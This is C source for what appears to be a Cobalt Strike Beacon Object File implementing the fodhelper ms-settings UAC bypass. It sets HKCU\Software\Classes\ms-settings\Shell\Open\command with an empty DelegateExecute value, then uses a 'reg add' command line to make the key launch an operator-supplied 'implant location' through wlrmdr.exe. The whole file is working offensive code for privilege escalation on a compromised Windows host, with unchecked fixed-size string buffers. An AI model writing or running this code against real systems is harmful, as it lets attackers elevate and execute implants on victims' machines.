#include "beacon.h"
#include <windows.h>
#include <stdio.h>

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

typedef LONG (WINAPI *RegCreateKeyExA_t)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, CONST LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG (WINAPI *RegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE *, DWORD);
typedef LONG (WINAPI *RegDeleteTreeA_t)(HKEY, LPCSTR);
typedef LONG (WINAPI *RegCloseKey_t)(HKEY);
typedef LONG (WINAPI *RegRenameKey_t)(HKEY, LPCSTR, LPCSTR);
typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

size_t my_strlen(const char *str) {
    size_t len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}

void my_strcpy(char *dest, const char *src) {
    while (*src) {
        *dest++ = *src++;
    }
    *dest = '\0';
}

void my_strcat(char *dest, const char *src) {
    while (*dest) {
        dest++;
    }
    my_strcpy(dest, src);
}

void go(char *args, int len) {
    HMODULE advapi32 = KERNEL32$LoadLibraryA("Advapi32.dll");
    HMODULE kernel32 = KERNEL32$LoadLibraryA("Kernel32.dll");
    if (!advapi32 || !kernel32) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load required libraries.");
        return;
    }

    RegCreateKeyExA_t ADVAPI32$RegCreateKeyExA = (RegCreateKeyExA_t) KERNEL32$GetProcAddress(advapi32, "RegCreateKeyExA");
    RegSetValueExA_t ADVAPI32$RegSetValueExA = (RegSetValueExA_t) KERNEL32$GetProcAddress(advapi32, "RegSetValueExA");
    RegDeleteTreeA_t ADVAPI32$RegDeleteTreeA = (RegDeleteTreeA_t) KERNEL32$GetProcAddress(advapi32, "RegDeleteTreeA");
    RegCloseKey_t ADVAPI32$RegCloseKey = (RegCloseKey_t) KERNEL32$GetProcAddress(advapi32, "RegCloseKey");
    RegRenameKey_t ADVAPI32$RegRenameKey = (RegRenameKey_t) KERNEL32$GetProcAddress(advapi32, "RegRenameKey");
    CreateProcessA_t KERNEL32$CreateProcessA = (CreateProcessA_t) KERNEL32$GetProcAddress(kernel32, "CreateProcessA");
    VOID (WINAPI *KERNEL32$Sleep)(DWORD) = (VOID (WINAPI *)(DWORD)) KERNEL32$GetProcAddress(kernel32, "Sleep");

    if (!ADVAPI32$RegCreateKeyExA || !KERNEL32$Sleep || !ADVAPI32$RegSetValueExA || !ADVAPI32$RegDeleteTreeA || !ADVAPI32$RegCloseKey || !ADVAPI32$RegRenameKey || !KERNEL32$CreateProcessA) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve required functions.");
        return;
    }

    datap parser;
    BeaconDataParse(&parser, args, len);

    char *loc = BeaconDataExtract(&parser, NULL);

    if (!loc) {
        BeaconPrintf(CALLBACK_ERROR, "No implant location provided");
        return;
    }
        
    //char program[] = "cmd /c start %s", loc;
    char program[256];
    my_strcpy(program, "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ");
    my_strcat(program, loc);

    HKEY hKey;
    const char *regPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char *delegateExecute = "DelegateExecute";

    if (ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create random registry key");
        return;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Created registry key: '%s'", regPath);
    }

    if (ADVAPI32$RegSetValueExA(hKey, delegateExecute, 0, REG_SZ, (BYTE *)"", 1) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set DelegateExecute value");
        ADVAPI32$RegCloseKey(hKey);
        return;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Seting DelegateExecute value to an empty string");
    }

    KERNEL32$Sleep(5000);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    //char *cmd = "cmd /c reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /t REG_SZ /d \"+program+\" /f";

    char cmd[256];
    my_strcpy(cmd, "cmd /c reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /t REG_SZ /d \"");
    my_strcat(cmd, program);
    my_strcat(cmd, "\" /f");

    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to start fodhelper.exe");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Seting the default value to the program command to '%s'", program);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    }
}
